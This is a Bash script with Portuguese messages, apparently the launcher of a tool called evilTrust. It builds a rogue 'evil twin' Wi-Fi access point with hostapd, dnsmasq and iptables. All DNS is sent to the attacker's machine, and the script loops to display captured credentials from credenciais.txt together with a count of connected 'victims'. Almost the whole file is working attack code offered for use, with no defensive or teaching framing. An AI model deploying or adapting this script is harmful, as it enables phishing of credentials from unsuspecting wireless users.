#!/bin/bash

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n\n[*] Saindo...\n"
    cleanup
    exit 0
}

function cleanup(){
    rm -f dnsmasq.conf hostapd.conf 2>/dev/null
    rm -rf iface 2>/dev/null
    rm -f credenciais.txt 2>/dev/null
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
}

function banner(){
    echo -e "\n[*] Iniciando o evilTrust..."
    sleep 0.05
}

function dependencies(){
    counter=0
    dependencias=(php dnsmasq hostapd)

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            let counter+=1
        fi
    done

    if [ "$counter" -eq 3 ]; then
        echo -e "\n[*] Iniciando...\n"
        sleep 3
    else
        echo -e "\n[!] É necessário ter as ferramentas php, dnsmasq e hostapd instaladas para executar este script\n"
        exit 1
    fi
}

function getCredentials(){
    activeHosts=0
    while true; do
        echo -e "\n[*] Aguardando credenciais (Ctrl+C para sair)...\n"
        echo -e "Vítimas conectadas: $activeHosts\n"
        find -name credenciais.txt | xargs cat 2>/dev/null
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3
        clear
    done
}

function startAttack(){
    clear
    if [[ -e credenciais.txt ]]; then
        rm -rf credenciais.txt
    fi

    echo -e "\n[*] Listando interfaces de rede disponíveis..."
    airmon-ng start wlan0 > /dev/null 2>&1
    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs)
    choosed_interface=""
    counter=1

    for interface in $interface; do
        let counter++
    done

    checker=0
    while [ $checker -ne 1 ]; do
        echo -ne "\n[*] Nome da interface (Ex: wlan0mon): " && read choosed_interface

        for interface in $interface; do
            if [ "$choosed_interface" == "$interface" ]; then
                checker=1
            fi
        done

        if [ $checker -eq 0 ]; then
            echo -e "\n[!] A interface fornecida não existe"
        fi
    done

    rm iface 2>/dev/null
    echo -ne "\n[*] Nome do ponto de acesso a ser utilizado (Ex: wifiGratis): " && read -r use_ssid
    echo -ne "[*] Canal a ser utilizado (1-12): " && read use_channel
    echo -e "\n[!] Finalizando todas as conexões...\n"
    sleep 2
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "interface=$choosed_interface\n" > hostapd.conf
    echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$use_ssid\n" >> hostapd.conf
    echo -e "hw_mode=g\n" >> hostapd.conf
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf
    echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

    echo -e "[*] Configurando interface $choosed_interface\n"
    sleep 2
    echo -e "[*] Iniciando hostapd..."
    hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6

    echo -e "\n[*] Configurando dnsmasq..."
    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
    echo -e "log-queries\n" >> dnsmasq.conf
    echo -e "log-dhcp\n" >> dnsmasq.conf
    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
    sleep 1

    echo -e "[*] Iniciando dnsmasq..."
    dnsmasq -C dnsmasq.conf > /dev/null 2>&1 &
    sleep 2

    echo -e "\n[*] Habilitando o redirecionamento de pacotes..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 8.8.8.8
    iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to 8.8.8.8

    echo -e "[*] Iniciando o servidor DHCP..."
    sleep 2
    /etc/init.d/isc-dhcp-server start > /dev/null 2>&1
    sleep 5

    echo -e "[*] Ataque iniciado!\n"
    getCredentials
}

cleanup
banner
dependencies
startAttack
